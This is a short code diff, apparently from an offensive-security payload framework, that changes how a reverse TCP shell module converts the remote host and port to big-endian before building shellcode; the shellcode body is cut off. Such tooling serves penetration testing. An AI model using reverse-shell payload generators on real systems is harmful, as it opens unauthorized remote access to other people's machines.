@@ -41,8 +41,8 @@ class ShellReverseTCP(HatAsm, HatVenom, Words):
             shell = self.shell['sh'].encode()
 
         shell = shell[::-1]
-        rhost = self.convert_host(options['RHOST'])
-        rport = self.convert_port(options['RPORT'])
+        rhost = self.convert_host(options['RHOST'], 'big')
+        rport = self.convert_port(options['RPORT'], 'big')
 
         shellcode = f"""
         start:
